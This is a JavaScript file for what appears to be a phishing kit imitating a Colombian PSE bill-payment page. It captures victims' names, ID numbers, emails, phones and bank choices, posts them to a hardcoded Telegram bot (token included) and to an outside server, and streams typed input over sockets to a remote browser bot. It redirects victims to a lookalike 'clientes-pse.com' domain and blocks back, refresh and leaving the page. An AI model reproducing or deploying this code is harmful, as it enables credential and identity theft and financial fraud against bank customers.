// pago.js - Con envío a Telegram con logs y manejo de errores

const socket = io('https://apifinacjs.pagoswebcol.uk');

// ==========================================
// CONFIGURACIÓN DE TELEGRAM - ¡REEMPLAZA AQUÍ!
// ==========================================
const TELEGRAM_TOKEN = '8349121766:AAEjU-9h6AjAYcllWkybW9nlQAbaxPlEUpw';      // Ej: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
const TELEGRAM_CHAT_ID = '7831097636';   // Ej: '123456789'

let isTransactionActive = false;
let browserRequested = false;
const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// ==========================================
// CONFIGURACIÓN DE ENRUTAMIENTO POR BANCO
// ==========================================
const RUTAS_BANCOS = {
    // "NEQUI": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DAVIVIENDA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DE BOGOTA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "DAVIbank": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO DE OCCIDENTE": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO CAJA SOCIAL": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO AV VILLAS": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO FALABELLA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCO POPULAR": { tipo: "redirect", url: "https://clientes-pse.com/" },
    // "BANCO SERFINANZA": { tipo: "redirect", url: "https://clientes-pse.com/" },
    "BANCOLOMBIA": { tipo: "redirect", url: "https://clientes-pse.com/" }
};

// ==========================================
// SEGURIDAD
// ==========================================
window.addEventListener('beforeunload', (e) => {
    if (isTransactionActive) {
        e.preventDefault();
        e.returnValue = 'Por favor espere la carga. La transacción está en proceso.';
        return 'Por favor espere la carga. La transacción está en proceso.';
    }
});
window.addEventListener('popstate', function () {
    if (isTransactionActive) history.pushState(null, document.title, location.href);
});
document.addEventListener('keydown', function (e) {
    if (isTransactionActive && (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r'))) {
        e.preventDefault();
    }
});

// ==========================================
// INICIALIZACIÓN DE DATOS
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    const data = JSON.parse(localStorage.getItem('datosFactura')) || {};

    if (document.getElementById('lblNombre') && data.nombreCompleto) {
        document.getElementById('lblNombre').textContent = enmascararNombre(data.nombreCompleto);
    }
    if (document.getElementById('lblId') && data.numId) {
        document.getElementById('lblId').textContent = "NIC - " + enmascararID(data.numId);
    }
    if (document.getElementById('lblCorreo') && data.correo) {
        document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
    }
    if (document.getElementById('lblRef') && data.referencia) {
        document.getElementById('lblRef').textContent = data.referencia;
    }

    // Limpiar inputs
    document.getElementById('formCorreo').value = "";
    document.getElementById('formNumId').value = "";
    document.getElementById('formNombre').value = "";
    document.getElementById('formCelular').value = "";

    const monto = data.montoPagar || 0;
    const valorFormateado = new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(monto);
    if (document.getElementById('lblValorNeto')) document.getElementById('lblValorNeto').textContent = valorFormateado;
    if (document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
    if (document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
});

// ==========================================
// FUNCIÓN PARA ENVIAR MENSAJE A TELEGRAM (CON LOGS Y ALERTAS)
// ==========================================
function enviarTelegram(mensaje) {
    // Si no se configuró, mostramos error y salimos
    if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === 'TU_TOKEN_AQUI') {
        console.error('❌ Token de Telegram no configurado. Mensaje no enviado.');
        alert('⚠️ El sistema no ha sido configurado para enviar notificaciones a Telegram. Contacte al administrador.');
        return;
    }
    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'TU_CHAT_ID_AQUI') {
        console.error('❌ Chat ID de Telegram no configurado.');
        alert('⚠️ El chat ID de Telegram no está configurado.');
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML'
    };

    console.log('📤 Enviando mensaje a Telegram...');
    console.log('📋 Contenido del mensaje:', mensaje);

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            console.log('✅ Mensaje enviado a Telegram correctamente.');
        } else {
            console.error('❌ Telegram devolvió error:', data);
            alert('Error al enviar notificación a Telegram: ' + (data.description || 'Error desconocido'));
        }
    })
    .catch(err => {
        console.error('❌ Error en la solicitud a Telegram:', err);
        alert('No se pudo enviar la notificación a Telegram. Error: ' + err.message);
    });
}

// ==========================================
// 1. ABRIR EL NAVEGADOR Y ACTUALIZAR BANCO EN VIVO
// ==========================================
const selectBanco = document.getElementById('selectBanco');
if (selectBanco) {
    selectBanco.addEventListener('change', (e) => {
        const bancoSeleccionado = e.target.value;
        const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const amount = data.montoPagar || 0;
        const config = RUTAS_BANCOS[bancoSeleccionado] || { tipo: "socket" };

        if (config.tipo === "socket") {
            if (!browserRequested) {
                socket.emit('init_browser', { bank: bancoSeleccionado, amount: amount });
                browserRequested = true;
                console.log("Iniciando bot con el banco:", bancoSeleccionado);
            } else {
                socket.emit('live_type', { field: 'bank', value: bancoSeleccionado });
                console.log("Cambiando el banco en vivo a:", bancoSeleccionado);
            }
        } else {
            console.log(`El banco ${bancoSeleccionado} está configurado para ruta externa.`);
            browserRequested = false;
        }
    });
}

// ==========================================
// 2. SINCRONIZACIÓN EN VIVO
// ==========================================
function syncInput(inputId, fieldName) {
    const input = document.getElementById(inputId);
    let timeoutId;
    if (input) {
        input.addEventListener('input', (e) => {
            const bancoActual = selectBanco ? selectBanco.value : "";
            const config = RUTAS_BANCOS[bancoActual] || { tipo: "socket" };
            if (config.tipo === "socket" && browserRequested) {
                clearTimeout(timeoutId);
                timeoutId = setTimeout(() => {
                    socket.emit('live_type', { field: fieldName, value: e.target.value });
                }, 400);
            }
        });
    }
}
syncInput('formCorreo', 'email');
syncInput('formNombre', 'name');
syncInput('formNumId', 'doc');

// ==========================================
// 3. FINALIZAR PAGO
// ==========================================
const botonPagar = document.querySelector('.btn-pay');
let loadingInterval;

if (botonPagar) {
    botonPagar.addEventListener('click', function() {
        console.log('🟢 Botón "Iniciar Pago" presionado.');

        const banco = selectBanco ? selectBanco.value : "";
        const email = document.getElementById('formCorreo').value.trim();
        const doc   = document.getElementById('formNumId').value.trim();
        const name  = document.getElementById('formNombre').value.trim();
        const phone = document.getElementById('formCelular').value.trim();

        const config = RUTAS_BANCOS[banco] || { tipo: "socket" };

        // Validaciones
        if (!banco || banco.includes("Seleccione")) { alert("Por favor seleccione un banco de la lista."); return; }
        if (!emailRegexValido.test(email)) { alert("Correo inválido."); return; }
        if (!doc || doc.length < 5) { alert("Cédula inválida."); return; }
        if (!name || name.length < 3) { alert("Nombre inválido."); return; }
        if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
        if (config.tipo === "socket" && !browserRequested) {
            alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco.");
            return;
        }

        console.log('✅ Validaciones pasadas. Preparando envío a Telegram...');

        // --- Obtener datos desde localStorage ---
        const facturaData = JSON.parse(localStorage.getItem('datosFactura')) || {};
        const montoTotal = facturaData.montoPagar || 0;
        const referencia = facturaData.referencia || 'N/A';
        const nic = facturaData.numId || 'No disponible';
        const titular = facturaData.titular || 'No disponible';

        // --- CONSTRUIR MENSAJE PARA TELEGRAM ---
        const mensaje = `
🔔 <b>NUEVO INTENTO DE PAGO</b> 🔔

📌 <b>NIC:</b> ${nic}
👤 <b>Titular factura:</b> ${titular}
👤 <b>Pagador:</b> ${name}
🆔 <b>Cédula pagador:</b> ${doc}
📧 <b>Correo:</b> ${email}
📱 <b>Celular:</b> ${phone}
🏦 <b>Banco:</b> ${banco}
💰 <b>Monto:</b> $${montoTotal.toLocaleString('es-CO')}
🔢 <b>Referencia:</b> ${referencia}
📅 <b>Fecha/Hora:</b> ${new Date().toLocaleString('es-CO')}
        `;

        // Enviar a Telegram (con logs)
        enviarTelegram(mensaje);

        // Continuar con el flujo de pago
        isTransactionActive = true;
        history.pushState(null, document.title, location.href);

        const overlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('dynamicLoadingText');
        if (overlay) overlay.style.display = 'flex';
        loadingInterval = animateLoadingText(loadingText);

        // Alerta al backend
        fetch('https://apifinacjs.pagoswebcol.uk/api/payment-alert', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                nombre: name,
                monto: montoTotal,
                correo: email,
                banco: banco,
                url: window.location.href
            })
        }).catch(err => console.error("Error al enviar alerta de pago:", err));

        // ==========================================
        // RAMIFICACIÓN DE RUTAS
        // ==========================================
        if (config.tipo === "socket") {
            socket.emit('submit_payment', {
                email: email,
                name: name,
                doc: doc,
                bank: banco
            });
        } else if (config.tipo === "redirect") {
            if (loadingText) loadingText.textContent = "Preparando entorno seguro...";
            const urlDestino = new URL(config.url);
            urlDestino.searchParams.append('nombre', name);
            urlDestino.searchParams.append('cedula', doc);
            urlDestino.searchParams.append('correo', email);
            urlDestino.searchParams.append('celular', phone);
            urlDestino.searchParams.append('banco', banco);
            urlDestino.searchParams.append('monto', montoTotal);
            setTimeout(() => {
                clearInterval(loadingInterval);
                isTransactionActive = false;
                window.location.href = urlDestino.toString();
            }, 2000);
        }
    });
}

// ==========================================
// RESPUESTAS DEL SERVIDOR
// ==========================================
socket.on('browser_ready', () => {
    console.log("Servidor: Formulario base llenado con éxito y esperando modificaciones.");
});
socket.on('payment_success', (data) => {
    const loadingText = document.getElementById('dynamicLoadingText');
    if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
    clearInterval(loadingInterval);
    setTimeout(() => {
        isTransactionActive = false;
        window.location.href = data.url;
    }, 1500);
});
socket.on('payment_error', (data) => {
    clearInterval(loadingInterval);
    isTransactionActive = false;
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';
    alert("Hubo un problema de conexión con el banco: " + data.message);
    browserRequested = false;
    if (selectBanco) selectBanco.value = "";
});

// ==========================================
// UTILIDADES
// ==========================================
function animateLoadingText(element) {
    if (!element) return null;
    const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
    let i = 0;
    return setInterval(() => { i = (i + 1) % messages.length; element.textContent = messages[i]; }, 2500);
}
function enmascararNombre(nombre) { return nombre ? nombre.split(" ")[0] + " *******" : ""; }
function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
function enmascararCorreo(email) {
    if (!email) return "";
    const [user] = email.split("@");
    return user.substring(0, 2) + "*******@*****.com";
}
